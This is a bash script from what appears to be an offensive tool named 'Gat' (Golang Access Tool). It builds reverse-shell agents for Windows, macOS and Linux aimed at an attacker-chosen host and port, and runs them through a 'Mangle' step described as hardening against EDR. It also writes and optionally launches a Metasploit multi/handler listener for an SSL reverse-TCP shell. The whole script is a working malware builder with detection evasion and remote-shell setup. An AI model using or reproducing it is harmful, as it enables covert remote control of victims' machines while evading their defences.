#!/bin/bash
#Written by m1ddl3w4r3
#V0.4
#Script to create Gat malware on the fly and harden it against EDR.

#Colors
RED='/033[0;31m'
NC='/033[0m'

GWD=$(pwd)
################################################################################

#Meterpreter Resource File
RC="$GWD"/meterpreter/Gat.rc
if [ ! -f "$RC" ]; then
  #Metasploit Resource File
  echo 'use exploits/multi/handler'>> meterpreter/Gat.rc
  echo 'set payload python/shell_reverse_tcp_ssl'>> meterpreter/Gat.rc
  echo -e set LHOST "$2">> meterpreter/Gat.rc
  echo -e set LPORT "$3">> meterpreter/Gat.rc
  echo -e set HandlerSSLCert "$GWD"/server.pem>> meterpreter/Gat.rc
  echo 'exploit -j'>> meterpreter/Gat.rc
  
else
  rm -rf meterpreter/Gat.rc
  echo 'use exploits/multi/handler'>> meterpreter/Gat.rc
  echo 'set payload python/shell_reverse_tcp_ssl'>> meterpreter/Gat.rc
  echo -e set LHOST "$2">> meterpreter/Gat.rc
  echo -e set LPORT "$3">> meterpreter/Gat.rc
  echo -e set HandlerSSLCert "$GWD"/server.pem>> meterpreter/Gat.rc
  echo 'run -j'>> meterpreter/Gat.rc
fi

if [ ! -d "./Agents/" ]; then
    mkdir Agents/
fi
################################################################################

#Cleanup Tool
if [ "$1" = "Cleanup" ] || [ "$1" = "cleanup" ]; then
  cd $GWD
  make clean > /dev/null
  exit
fi
################################################################################

#Windows Gat Creator
if [ "$1" = "Windows" ] || [ "$1" = "windows" ]; then
  echo "Making Server Certificates"
  DEPENDS=$GWD/server.pem
  if [ ! -f "$DEPENDS" ]; then
    make depends > /dev/null 2>&1
  else
    exit
  fi
  echo "Making Agents"
  make windows64 LHOST=$2 LPORT=$3 > /dev/null 2>&1
  echo "Hardening Agents for EDR"
  $GWD/utils/Mangle -I $GWD/Gat.exe -M -O $GWD/Agents/GatEDR.exe -S 65 > /dev/null 2>&1
  rm $GWD/Gat.exe
  echo "Gat ready for deployment"
  #Prompt for Listener
  echo ""
  echo "Do you want to create a Metasploit Listener [ y/N ]"
  read LIS
  #Listener Creation if selected
  if [ "$LIS" = "Y" ] || [ "$LIS" = "y" ] || [ "$LIS" = "yes" ] || [ "$LIS" = "Yes"  ]; then
    sudo msfdb start && msfconsole -q -r $GWD/meterpreter/Gat.rc
    exit
  else
    echo "Listener not created use 'msfconsole -r meterpreter/Gat.rc' to create later."
  fi
  exit
fi
################################################################################

#Mac Gat Creator
if [ "$1" = "Mac" ] || [ "$1" = "mac" ]; then
  cd $GWD
  echo "Making Server Certificates"
  if [ ! -f "$DEPENDS" ]; then
    make depends > /dev/null 2>&1
  else
    exit
  fi
  echo "Making Agents"
  make macos64 LHOST=$2 LPORT=$3 > /dev/null 2>&1
  echo "Hardening Agents for EDR"
  $GWD/utils/Mangle -I $GWD/Gat -M -O $GWD/DarwinGatEDR -S 65 > /dev/null 2>&1
  rm -rf $GWD/Gat
  mv DarwinGatEDR Agents/
  echo "Gat ready for deployment"
  #Prompt for Listener
  echo ""
  echo "Do you want to create a Metasploit Listener [ y/N ]"
  read LIS

  #Listener Creation if selected
  if [ "$LIS" = "Y" ] || [ "$LIS" = "y" ] || [ "$LIS" = "yes" ] || [ "$LIS" = "Yes"  ]; then
    sudo msfdb start && msfconsole -q -r $GWD/meterpreter/Gat.rc
    exit
  else
    echo "Listener not created use 'msfconsole -q -r meterpreter/Gat.rc' to create later."
  fi
  exit
fi
################################################################################

#Linux Gat Creator
if [ "$1" = "Linux" ] || [ "$1" = "linux" ]; then
  cd $GWD
  echo "Making Server Certificates"
  if [ ! -f "$DEPENDS" ]; then
    make depends > /dev/null 2>&1
  else
    exit
  fi
  echo "Making Agents"
  make linux64 LHOST=$2 LPORT=$3 > /dev/null 2>&1
  echo "Hardening Agents for EDR"
  $GWD/utils/Mangle -I $GWD/Gat -M -O $GWD/LinuxGatEDR -S 65 > /dev/null 2>&1
  rm -rf $GWD/Gat
  mv LinuxGatEDR Agents/
  echo "Gat ready for deployment"
  #Prompt for Listener
  echo ""
  echo "Do you want to create a Metasploit Listener [ y/N ]"
  read LIS

  #Listener Creation if selected
  if [ "$LIS" = "Y" ] || [ "$LIS" = "y" ] || [ "$LIS" = "yes" ] || [ "$LIS" = "Yes"  ]; then
    sudo msfdb start && msfconsole -q -r $GWD/meterpreter/Gat.rc
    exit
  else
    echo "Listener not created use 'msfconsole -r meterpreter/Gat.rc' to create later."
  fi
  exit
fi
################################################################################

#Banner
if [ "$1" != "Linux" ] || [ "$1" != "linux" ] || [ "$1" != "Windows" ] || [ "$1" != "windows" ] || [ "$1" != "Mac" ] [ "$1" != "mac" ]; then
  echo "Golang Access Tool"
  echo "For when your after the big cheese."
  cat << EOF
          __      __
         /  \____/  \\
        | 0        0 |
         \ (o)  (o) /
           |      |
          _|  __  |_
         / |  __  | \\
        /  |  __  |  \\
       /   |      |   \\
      ========()========
     /  | |          | | \\
    /    \ \        / /   \\
   /      ^________ ^      \\
  |       /  _____/        |
   \     /   \  ___        /
    \    \    \_\  \      /
     \    \______  /     /
      \     _____\/_    /
      / / /        \ \ \\
EOF
  echo ""
  echo ""
  echo "Did you read the Github?"
  echo "Example:"
  echo "./Gat.sh [ windows|macos|linux ] 127.0.0.1 8443"
  make clean > /dev/null
  exit
fi
